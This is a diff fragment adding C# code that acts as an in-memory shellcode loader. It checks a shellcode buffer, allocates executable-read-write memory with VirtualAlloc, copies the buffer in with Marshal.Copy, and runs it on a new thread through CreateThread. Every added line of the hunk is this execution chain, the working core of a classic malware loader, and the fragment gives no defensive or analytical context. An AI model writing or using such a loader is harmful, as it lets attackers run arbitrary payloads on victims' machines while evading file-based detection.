@@ -1,0 +1,46 @@
+            if (shellcode == null || shellcode.Length == 0) 
+            {
+                Log("Error: Processed shellcode is empty.");
+                return;
+            }
+
+            // 4. Allocate Memory
+            Log("Allocating memory...");
+            IntPtr allocatedMemory = VirtualAlloc(
+                IntPtr.Zero, 
+                (uint)shellcode.Length, 
+                MEM_COMMIT | MEM_RESERVE, 
+                PAGE_EXECUTE_READWRITE
+            );
+
+            if (allocatedMemory == IntPtr.Zero)
+            {
+                Log("Memory allocation failed.");
+                return;
+            }
+
+            // 5. Copy Shellcode to Memory
+            Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
+
+            // 6. Execute
+            Log("Creating thread...");
+            uint threadId;
+            IntPtr hThread = CreateThread(
+                IntPtr.Zero, 
+                0, 
+                allocatedMemory, 
+                IntPtr.Zero, 
+                0, 
+                out threadId
+            );
+
+            if (hThread != IntPtr.Zero)
+            {
+                Log("Thread created (ID: " + threadId + "). Waiting for completion...");
+                WaitForSingleObject(hThread, INFINITE);
+                Log("Execution finished.");
+            }
+            else
+            {
+                Log("CreateThread failed.");
+            }
